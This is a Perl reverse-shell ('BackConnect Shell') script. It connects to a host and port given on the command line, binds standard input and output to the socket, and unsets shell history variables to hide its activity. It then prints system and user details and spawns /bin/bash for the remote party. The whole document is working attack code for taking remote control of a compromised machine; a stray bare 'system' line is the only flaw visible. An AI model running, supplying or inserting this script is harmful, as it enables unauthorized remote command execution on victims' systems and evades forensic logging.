#!/usr/bin/perl
use IO::Socket;
$system = '/bin/bash';
$ARGC=@ARGV;
print "# <==BackConnect Shell==> \n\n";
if ($ARGC!=2) {
 print "Usage: $0 [Host] [Port] \n\n";
 die "Ex: $0 127.0.0.1 1313 \n";
}
use Socket;
use FileHandle;
socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die print "[-] Unable to Resolve Host\n";
connect(SOCKET, sockaddr_in($ARGV[1], inet_aton($ARGV[0]))) or die print "[-] Unable to Connect Host\n";
print "[*] Resolving HostName\n";
print "[*] Connecting… $ARGV[0] \n";
print "[*] Spawning Shell \n";
print "[*] Connected to remote host \n";
print "[*] Connection established\n";
system
SOCKET->autoflush();
open(STDIN, ">&SOCKET");
open(STDOUT,">&SOCKET");
open(STDERR,">&SOCKET");
 print "# <==BackConnect Shell==> \n\n";
system("unset HISTFILE; unset SAVEHIST ;echo –==Systeminfo==– ; uname -a;echo;
echo –==Userinfo==– ; id;echo;echo –==Directory==– ; pwd;echo; echo –==Shell==– ;echo –===Who==– ; whoami;echo; ");
system($system);
#EOF
